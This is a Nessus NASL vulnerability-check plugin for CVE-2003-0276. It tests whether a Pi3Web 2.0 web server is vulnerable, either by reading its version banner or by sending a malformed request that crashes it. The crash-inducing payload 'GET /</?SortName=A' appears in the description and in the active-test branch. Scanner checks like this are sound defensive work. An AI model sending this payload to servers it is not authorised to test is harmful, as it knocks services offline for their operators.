#
# (C) Tenable Network Security
#

if(description)
{
 script_id(11695);
 script_cve_id("CVE-2003-0276");

 script_version ("$Revision: 1.6 $");
 
 name["english"] = "Pi3Web Webserver v2.0 Denial of Service";

 script_name(english:name["english"]);

 desc["english"] = "
The remote Pi3Web web server may crash when it is sent 
a malformed request, like :

	GET /</?SortName=A
	
	
Solution : Upgrade to Pi3Web 2.0.2 beta 2 or newer
Risk factor : High";

 script_description(english:desc["english"]);

 # Summary
 summary["english"] = "Tests for a DoS in Pi3Web";
 script_summary(english:summary["english"]);

 # Category
 script_category(ACT_MIXED_ATTACK);

 # Dependencie(s)
 script_dependencie("find_service.nes", "http_version.nasl");

 # Family
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"],
               francais:family["francais"]);

 # Copyright
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");

 script_require_ports("Services/www", 80);
 exit(0);
}


include ("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


banner = get_http_banner(port:port);
if ( "Pi3Web/" >!< banner ) exit(0);

if(safe_checks())
{
 	if(egrep(pattern:"^Server: Pi3Web/2\.0\.([01]|2 *beta *[01])([^0-9]|$)", string:banner))
       		security_hole(port);
}
else
{
	if(http_is_dead(port:port))exit(0);
 	req = http_get(item:"/</?SortName=A", port:port);
	res = http_keepalive_send_recv(port:port, data:req);
	if(http_is_dead(port:port))security_hole(port);
}

